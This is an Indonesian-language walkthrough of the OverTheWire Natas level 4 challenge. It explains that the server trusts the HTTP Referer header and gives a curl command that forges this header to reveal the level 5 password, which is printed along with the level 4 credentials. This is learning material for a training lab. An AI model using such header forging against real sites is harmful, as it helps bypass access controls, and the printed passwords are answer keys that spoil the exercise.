# Natas 4 → 5

## 🎯 Tujuan
Mendapatkan password untuk level 5 di **OverTheWire Natas**.

## 🔑 Kredensial
- Username: `natas4`
- Password: `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`
- URL: [http://natas4.natas.labs.overthewire.org](http://natas4.natas.labs.overthewire.org)

## 🛠️ Langkah
1. Saat membuka halaman Natas 4, muncul pesan:
→ Server mengecek **HTTP Referer header**.
2. Dari clue, server hanya menerima request jika **Referer berasal dari `http://natas5.natas.labs.overthewire.org/`**.
3. Gunakan `curl` dengan menambahkan header Referer:
```bash
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ \
     -H "Referer: http://natas5.natas.labs.overthewire.org/" \
     http://natas4.natas.labs.overthewire.org/
## ✅ Flag / Password Level 5
`0n35PkggAPm2zbEpOU802c0x0Msn1ToK`
